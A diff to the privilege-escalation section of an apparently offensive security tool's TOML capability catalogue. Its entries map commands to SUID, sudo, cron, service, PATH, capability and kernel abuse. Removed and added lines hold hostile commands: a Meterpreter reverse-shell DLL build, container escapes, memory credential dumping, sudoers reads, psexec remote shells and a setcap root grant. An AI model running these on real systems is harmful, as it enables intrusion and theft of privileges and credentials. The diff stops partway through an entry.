@@ -7588,602 +7588,2256 @@ args = ['beacon.t.{domain}', '{lhost}']
 output = 'lines'
 network = true
 
-# --------------------------------------------------------------------------
-# PRIVILEGE ESCALATION
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 5 — ESCALATION
+# ==========================================================================
 
 [[capability]]
-id = 'escalation.suid-discovery'
+id = 'escalation.suid-hunting'
 phase = 'escalation'
-label = 'SUID DISCOVERY'
-summary = 'Locate SUID and SGID binaries and flag exploitable ones'
+label = 'SUID HUNTING'
+summary = 'Locate and triage SUID/SGID binaries for privilege abuse'
 inputs = [
-  { key = 'path', type = 'path', required = false, default = '/' },
+  { key = 'rhost', type = 'target', required = false, default = '127.0.0.1' },
+  { key = 'username', type = 'username', required = false, default = '' },
+  { key = 'password', type = 'password', required = false, default = '' },
 ]
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
-name = 'SUID Binaries'
-args = ['{path}', '-perm', '-4000', '-type', 'f']
+name = 'SUID Sweep'
+args = ['/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
 output = 'lines'
 network = false
-
 [[capability.provider.operation]]
-name = 'SGID Binaries'
-args = ['{path}', '-perm', '-2000', '-type', 'f']
+name = 'SGID Sweep'
+args = ['/', '-perm', '-2000', '-type', 'f', '2>/dev/null']
 output = 'lines'
 network = false
-
 [[capability.provider.operation]]
-name = 'Both Modes'
-args = ['{path}', '-perm', '-4000', '-o', '-perm', '-2000', '-type', 'f']
+name = 'Root Owned SUID'
+args = ['/', '-user', 'root', '-perm', '-4000', '-type', 'f', '2>/dev/null']
 output = 'lines'
 network = false
-[[capability.provider]]
-binary = 'linpeas'
 [[capability.provider.operation]]
-name = 'Auto Enum'
-args = ['-a']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.kernel-probing'
-phase = 'escalation'
-label = 'KERNEL PROBING'
-summary = 'Collect kernel and OS details and suggest matching exploits'
-inputs = [
-  { key = 'kernel', type = 'text', required = true },
-]
-[[capability.provider]]
-binary = 'uname'
-[[capability.provider.operation]]
-name = 'Kernel Info'
-args = ['-a']
+name = 'Non Standard SUID'
+args = ['/', '-perm', '-4000', '-type', 'f', '-not', '-path', '/usr/bin/*', '-not', '-path', '/bin/*', '2>/dev/null']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'linux-exploit-suggester'
+binary = 'ls'
 [[capability.provider.operation]]
-name = 'Exploit Suggest'
-args = ['--kernel', '{kernel}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'searchsploit'
-[[capability.provider.operation]]
-name = 'Kernel Exploits'
-args = ['linux', 'kernel', 'local']
+name = 'SUID Detail Listing'
+args = ['-la', '/usr/bin/', '/usr/sbin/']
 output = 'lines'
 network = false
-[[capability.provider]]
-binary = 'les2'
-[[capability.provider.operation]]
-name = 'Suggester Two'
-args = ['-k', '{kernel}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.credential-hunting'
-phase = 'escalation'
-label = 'CREDENTIAL HUNTING'
-summary = 'Hunt configuration files, histories and keys for credentials'
-inputs = [
-  { key = 'path', type = 'path', required = false, default = '/' },
-]
-[[capability.provider]]
-binary = 'find'
-[[capability.provider.operation]]
-name = 'Config Files'
-args = ['{path}', '-name', '*.conf', '-o', '-name', '*.config', '-o', '-name', '*.ini', '-o', '-name', '*.env']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'History Files'
-args = ['{path}', '-name', '.bash_history', '-o', '-name', '.zsh_history']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'SSH Keys'
-args = ['{path}', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-o', '-name', '*.pem']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'grep'
-[[capability.provider.operation]]
-name = 'Secret Patterns'
-args = ['-rli', '-e', 'password', '-e', 'passwd', '-e', 'token', '{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'mimipenguin'
-[[capability.provider.operation]]
-name = 'Memory Creds'
-args = ['--dump']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.service-audit'
-phase = 'escalation'
-label = 'SERVICE AUDIT'
-summary = 'Enumerate running services and their writable configurations'
-[[capability.provider]]
-binary = 'systemctl'
-[[capability.provider.operation]]
-name = 'Running Services'
-args = ['list-units', '--type=service', '--state=running']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'ss'
-[[capability.provider.operation]]
-name = 'Listening Ports'
-args = ['-tlnp']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nmap'
-[[capability.provider.operation]]
-name = 'Local Service Scan'
-args = ['-sV', '-p', '22,80,443,445,3306,5432', '127.0.0.1']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Local Vuln Scan'
-args = ['--script', 'vuln', '-p', '80,443,445', '127.0.0.1']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'searchsploit'
-[[capability.provider.operation]]
-name = 'Service Exploits'
-args = ['linux', 'local']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'escalation.sudo-abuse'
-phase = 'escalation'
-label = 'SUDO ABUSE'
-summary = 'Enumerate sudo rights and flag GTFOBins style escalation'
-[[capability.provider]]
-binary = 'sudo'
-[[capability.provider.operation]]
-name = 'List Rights'
-args = ['-l']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'linpeas'
-[[capability.provider.operation]]
-name = 'Sudo Check'
-args = ['-s']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'pspy'
-[[capability.provider.operation]]
-name = 'Process Watch'
-args = ['-pf', '-i', '1000']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.capability-audit'
-phase = 'escalation'
-label = 'CAPABILITY AUDIT'
-summary = 'Enumerate file capabilities that grant elevated operations'
 [[capability.provider]]
 binary = 'getcap'
 [[capability.provider.operation]]
-name = 'Recursive Caps'
-args = ['-r', '/']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'capsh'
-[[capability.provider.operation]]
-name = 'Process Caps'
-args = ['--print']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'linpeas'
-[[capability.provider.operation]]
-name = 'Caps Check'
-args = ['-a']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.cron-audit'
-phase = 'escalation'
-label = 'CRON AUDIT'
-summary = 'Enumerate cron jobs and writable scripts they execute'
-[[capability.provider]]
-binary = 'crontab'
-[[capability.provider.operation]]
-name = 'User Cron'
-args = ['-l']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'find'
-[[capability.provider.operation]]
-name = 'Writable Crons'
-args = ['/etc/cron*', '-writable', '-type', 'f']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Writable Scripts'
-args = ['/', '-name', '*.sh', '-writable', '-type', 'f']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'pspy'
-[[capability.provider.operation]]
-name = 'Cron Watch'
-args = ['-pf', '-i', '1000']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.path-hijack'
-phase = 'escalation'
-label = 'PATH HIJACK'
-summary = 'Find writable PATH directories and relative-call abuse'
-[[capability.provider]]
-binary = 'printenv'
-[[capability.provider.operation]]
-name = 'Show Path'
-args = ['PATH']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'find'
-[[capability.provider.operation]]
-name = 'Writable Path Dirs'
-args = ['/usr/local/bin', '/usr/bin', '-writable', '-type', 'd']
+name = 'Capability Sweep'
+args = ['-r', '/', '2>/dev/null']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
-name = 'Relative Calls'
-args = ['/usr/bin/suid-binary']
+name = 'SUID Binary Strings'
+args = ['/usr/bin/passwd']
 output = 'lines'
 network = false
-[[capability.provider]]
-binary = 'strace'
-[[capability.provider.operation]]
-name = 'Execve Trace'
-args = ['-f', '-e', 'trace=execve', '/usr/bin/suid-binary']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.token-abuse'
-phase = 'escalation'
-label = 'TOKEN ABUSE'
-summary = 'Enumerate Windows token privileges for impersonation paths'
-[[capability.provider]]
-binary = 'whoami'
-[[capability.provider.operation]]
-name = 'Privilege Dump'
-args = ['/priv']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'winpeas'
-[[capability.provider.operation]]
-name = 'Token Enum'
-args = ['quiet', 'tokeninfo']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'seatbelt'
-[[capability.provider.operation]]
-name = 'Token Audit'
-args = ['TokenPrivileges', 'TokenGroups']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.registry-audit'
-phase = 'escalation'
-label = 'REGISTRY AUDIT'
-summary = 'Audit Windows registry keys that enable privilege escalation'
-[[capability.provider]]
-binary = 'reg'
-[[capability.provider.operation]]
-name = 'Always Install'
-args = ['query', 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer', '/v', 'AlwaysInstallElevated']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Run Keys'
-args = ['query', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Winlogon'
-args = ['query', 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'DefaultPassword']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'winpeas'
-[[capability.provider.operation]]
-name = 'Registry Enum'
-args = ['quiet', 'applicationsinfo']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'accesschk'
-[[capability.provider.operation]]
-name = 'Key Permissions'
-args = ['-kvuqsw', 'HKLM\SYSTEM\CurrentControlSet\Services']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.dll-hijack'
-phase = 'escalation'
-label = 'DLL HIJACK'
-summary = 'Identify missing DLLs and writable directories to plant them'
-[[capability.provider]]
-binary = 'winpeas'
-[[capability.provider.operation]]
-name = 'DLL Enum'
-args = ['quiet', 'applicationsinfo']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'accesschk'
-[[capability.provider.operation]]
-name = 'Write Check'
-args = ['-wvud', 'C:\Program Files\']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'msfvenom'
-[[capability.provider.operation]]
-name = 'Hijack DLL'
-args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST=10.10.10.1', 'LPORT=4444', '-f', 'dll']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'escalation.container-escape'
-phase = 'escalation'
-label = 'CONTAINER ESCAPE'
-summary = 'Enumerate container misconfiguration enabling host escape'
-[[capability.provider]]
-binary = 'docker'
-[[capability.provider.operation]]
-name = 'Socket Escape'
-args = ['-H', 'unix:///var/run/docker.sock', 'run', '-v', '/:/host', '-it', 'alpine', 'chroot', '/host', '/bin/bash']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Runtime Inspect'
-args = ['ps']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Image List'
-args = ['images']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'capsh'
-[[capability.provider.operation]]
-name = 'Container Caps'
-args = ['--print']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nsenter'
-[[capability.provider.operation]]
-name = 'Namespace Enter'
-args = ['--mount=/proc/1/ns/mnt', '--', '/bin/bash']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'linpeas'
-[[capability.provider.operation]]
-name = 'Container Check'
-args = ['-a']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.cloud-escalation'
-phase = 'escalation'
-label = 'CLOUD ESCALATION'
-summary = 'Map cloud IAM privileges and metadata service exposure'
-inputs = [
-  { key = 'provider', type = 'list', required = false, default = 'aws' },
-]
 [[capability.provider]]
 binary = 'curl'
 [[capability.provider.operation]]
-name = 'AWS Metadata'
-args = ['-s', 'http://169.254.169.254/latest/meta-data/']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'GCP Metadata'
-args = ['-sH', 'Metadata-Flavor: Google', 'http://169.254.169.254/computeMetadata/v1/']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Azure Metadata'
-args = ['-sH', 'Metadata: true', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01']
+name = 'GTFOBins Lookup'
+args = ['-sk', 'https://gtfobins.github.io/gtfobins/env/']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'aws'
+binary = 'nxc'
 [[capability.provider.operation]]
-name = 'Caller Identity'
-args = ['sts', 'get-caller-identity']
+name = 'Remote SUID Sweep'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'enum_privileges']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'pmapper'
+binary = 'impacket-psexec'
 [[capability.provider.operation]]
-name = 'Privilege Graph'
-args = ['graph', 'create']
+name = 'Remote Shell Probe'
+args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
-[[capability.provider]]
-binary = 'enumerate-iam'
-[[capability.provider.operation]]
-name = 'IAM Brute'
-args = ['--access-key', 'AKIA', '--secret-key', 'SECRET']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'escalation.group-abuse'
-phase = 'escalation'
-label = 'GROUP ABUSE'
-summary = 'Exploit privileged group membership for host takeover'
-[[capability.provider]]
-binary = 'id'
-[[capability.provider.operation]]
-name = 'Group Membership'
-args = ['-aG']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'docker'
-[[capability.provider.operation]]
-name = 'Docker Group Root'
-args = ['run', '-v', '/:/host', '-it', 'alpine', 'chroot', '/host', '/bin/bash']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'lxc'
-[[capability.provider.operation]]
-name = 'LXD Privileged'
-args = ['init', 'ubuntu:latest', 'privesc', '-c', 'security.privileged=true']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'LXD Root Mount'
-args = ['config', 'device', 'add', 'privesc', 'hostroot', 'disk', 'source=/', 'path=/mnt/root', 'recursive=true']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'find'
-[[capability.provider.operation]]
-name = 'Group Writable'
-args = ['/', '-group', 'docker', '-type', 'f']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'escalation.permission-audit'
-phase = 'escalation'
-label = 'PERMISSION AUDIT'
-summary = 'Audit world writable files and ACL misconfiguration'
-inputs = [
-  { key = 'path', type = 'path', required = false, default = '/' },
-]
-[[capability.provider]]
-binary = 'find'
-[[capability.provider.operation]]
-name = 'Writable Files'
-args = ['{path}', '-writable', '-type', 'f']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Writable Dirs'
-args = ['{path}', '-writable', '-type', 'd']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Other Writable'
-args = ['{path}', '-perm', '-o+w', '-type', 'f']
-output = 'lines'
-network = false
 [[capability.provider]]
 binary = 'stat'
 [[capability.provider.operation]]
-name = 'Permission Detail'
-args = ['-c', '%a %U %G %n', '{path}']
+name = 'Binary Permission Detail'
+args = ['-c', '%a %U %n', '/usr/bin/sudo']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'getfacl'
+binary = 'ps'
 [[capability.provider.operation]]
-name = 'ACL Dump'
-args = ['{path}']
+name = 'Privileged Process Map'
+args = ['aux']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'namei'
-[[capability.provider.operation]]
-name = 'Path Chain'
-args = ['-l', '{path}']
-output = 'lines'
-network = true
+network = false
 
 [[capability]]
-id = 'escalation.escalation-validation'
+id = 'escalation.sudo-misconfig'
 phase = 'escalation'
-label = 'ESCALATION VALIDATION'
-summary = 'Prove and record elevated privilege with audit evidence'
+label = 'SUDO MISCONFIG'
+summary = 'Enumerate sudo rules and abuse permissive sudo entries'
+inputs = [
+  { key = 'sudo-password', type = 'password', required = false, default = '' },
+]
 [[capability.provider]]
-binary = 'id'
+binary = 'sudo'
 [[capability.provider.operation]]
-name = 'Identity Proof'
-args = ['-a']
+name = 'Rule Listing'
+args = ['-l']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'whoami'
+binary = 'sudo'
 [[capability.provider.operation]]
-name = 'User Proof'
-args = ['/all']
+name = 'Verbose Rule Listing'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sudo'
+[[capability.provider.operation]]
+name = 'Root Command Probe'
+args = ['-S', '-k', '-l']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
-name = 'Shadow Proof'
+name = 'Sudoers Direct Read'
+args = ['/etc/sudoers']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Sudoers Dropins'
+args = ['/etc/sudoers.d/*']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'NOPASSWD Hunt'
+args = ['-ri', 'nopasswd', '/etc/sudoers', '/etc/sudoers.d/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sudo'
+[[capability.provider.operation]]
+name = 'Env Keep Check'
+args = ['-l', 'env_keep']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getent'
+[[capability.provider.operation]]
+name = 'Group Enumeration'
+args = ['group']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'id'
+[[capability.provider.operation]]
+name = 'Current Identity'
+args = []
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Sudo Version Detect'
+args = ['/', '-name', 'sudo', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sudo'
+[[capability.provider.operation]]
+name = 'Version Banner'
+args = ['-V']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GTFOBins Sudo Lookup'
+args = ['-sk', 'https://gtfobins.github.io/gtfobins/sudo/']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.cron-abuse'
+phase = 'escalation'
+label = 'CRON ABUSE'
+summary = 'Enumerate scheduled jobs and hijack writable cron scripts'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'User Crontab Read'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'System Crontab'
+args = ['/etc/crontab']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Cron Spool Inventory'
+args = ['-la', '/var/spool/cron/', '/etc/cron.d/', '/etc/cron.daily/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Cron Dropins Read'
+args = ['/etc/cron.d/*']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable Cron Scripts'
+args = ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.weekly/', '-writable', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Cron Process Check'
+args = ['aux']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Enumeration'
+args = ['list-timers', '--all', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Unit Dump'
+args = ['cat', 'logrotate.timer']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Timer Writable Units'
+args = ['/etc/systemd/system/', '-writable', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Anacron Read'
+args = ['/etc/anacrontab']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Cron Binary Perms'
+args = ['-c', '%a %U %n', '/usr/sbin/cron']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Path Hook Hunt'
+args = ['-ri', 'cron', '/etc/profile', '/etc/bash.bashrc']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.service-exploit'
+phase = 'escalation'
+label = 'SERVICE EXPLOIT'
+summary = 'Abuse weakly configured or writable systemd services'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Running Services'
+args = ['list-units', '--type=service', '--state=running', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'All Units'
+args = ['list-unit-files', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable Unit Files'
+args = ['/etc/systemd/system/', '/usr/lib/systemd/system/', '-writable', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Unit Content Dump'
+args = ['/etc/systemd/system/{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Root Exec Hunt'
+args = ['-l', 'User=root', '/etc/systemd/system/*.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Relative Path Execs'
+args = ['-r', '^ExecStart', '/etc/systemd/system/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Daemon Reload'
+args = ['daemon-reload']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Restart'
+args = ['restart', '{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Status'
+args = ['status', '{name}.service', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Root Service Verify'
+args = ['aux']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'journalctl'
+[[capability.provider.operation]]
+name = 'Service Logs'
+args = ['-u', '{name}.service', '-n', '30', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Bin Path Writability'
+args = ['-la', '/usr/local/bin/', '/usr/local/sbin/']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.path-hijack'
+phase = 'escalation'
+label = 'PATH HIJACK'
+summary = 'Detect writable PATH directories and hijack privileged lookups'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'printenv'
+[[capability.provider.operation]]
+name = 'PATH Dump'
+args = ['PATH']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'bash'
+[[capability.provider.operation]]
+name = 'Login PATH Dump'
+args = ['-lc', 'echo $PATH']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable PATH Dirs'
+args = ['/usr/local/bin/', '/usr/local/sbin/', '/usr/bin/', '/usr/sbin/', '-writable', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'PATH Dir Listing'
+args = ['-la', '/usr/local/bin/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Profile PATH Edits'
+args = ['-rn', 'PATH=', '/etc/profile', '/etc/profile.d/', '/home/*/.bashrc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Profile Dump'
+args = ['/etc/profile']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'which'
+[[capability.provider.operation]]
+name = 'Resolve Common Bins'
+args = ['-a', 'python3', 'curl', 'systemctl']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'echo'
+[[capability.provider.operation]]
+name = 'Hijack Dry Run'
+args = ['$PATH']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Unowned Bins'
+args = ['/usr/local/bin/', '-nouser', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Dir Perms Detail'
+args = ['-c', '%a %U %n', '/usr/local/bin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Cron Relative Paths'
+args = ['-rn', 'ExecStart', '/etc/systemd/system/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Process Environment Peek'
+args = ['auxeww']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.capability-abuse'
+phase = 'escalation'
+label = 'CAPABILITY ABUSE'
+summary = 'Enumerate file capabilities and exploit privileged capabilities'
+inputs = [
+  { key = 'rhost', type = 'target', required = false, default = '127.0.0.1' },
+]
+[[capability.provider]]
+binary = 'getcap'
+[[capability.provider.operation]]
+name = 'Full Capability Sweep'
+args = ['-r', '/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getcap'
+[[capability.provider.operation]]
+name = 'Bin Dir Capabilities'
+args = ['-r', '/usr/bin/', '/usr/sbin/', '/usr/local/bin/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getcap'
+[[capability.provider.operation]]
+name = 'Home Dir Capabilities'
+args = ['-r', '/home/', '/root/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'setcap'
+[[capability.provider.operation]]
+name = 'Set Capability Probe'
+args = ['-v', 'cap_setuid+ep', '/usr/bin/python3']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getpcaps'
+[[capability.provider.operation]]
+name = 'Process Capabilities'
+args = ['$$']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'capsh'
+[[capability.provider.operation]]
+name = 'Capability Print'
+args = ['--print']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'capsh'
+[[capability.provider.operation]]
+name = 'Decode Cap Mask'
+args = ['--decode=0xffffffffffffffff']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GTFOBins Python Lookup'
+args = ['-sk', 'https://gtfobins.github.io/gtfobins/python/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GTFOBins Perl Lookup'
+args = ['-sk', 'https://gtfobins.github.io/gtfobins/perl/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Cap Binary Verify'
+args = ['/', '-type', 'f', '-name', 'python3', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Binary Perms Detail'
+args = ['-c', '%a %U %n', '/usr/bin/python3']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'id'
+[[capability.provider.operation]]
+name = 'Identity Verify'
+args = []
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.kernel-exploit'
+phase = 'escalation'
+label = 'KERNEL EXPLOIT'
+summary = 'Fingerprint kernel and match local privilege escalation exploits'
+inputs = [
+  { key = 'rhost', type = 'target', required = false, default = '127.0.0.1' },
+  { key = 'username', type = 'username', required = false, default = '' },
+  { key = 'password', type = 'password', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'uname'
+[[capability.provider.operation]]
+name = 'Kernel Release'
+args = ['-r']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Full Banner'
+args = ['-a']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Proc Version'
+args = ['/proc/version']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'dpkg'
+[[capability.provider.operation]]
+name = 'Installed Packages'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'rpm'
+[[capability.provider.operation]]
+name = 'RPM Package Query'
+args = ['-qa']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'Kernel Priv Esc Search'
+args = ['--json', 'linux kernel', 'privilege escalation']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'Sudo Exploit Search'
+args = ['--json', 'sudo']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'PwnKit Search'
+args = ['--json', 'pwnkit']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CVE Reference Lookup'
+args = ['-sk', 'https://cve.circl.lu/api/search/linux', '--data-urlencode', 'q=kernel privilege escalation']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'gcc'
+[[capability.provider.operation]]
+name = 'Compiler Check'
+args = ['--version']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
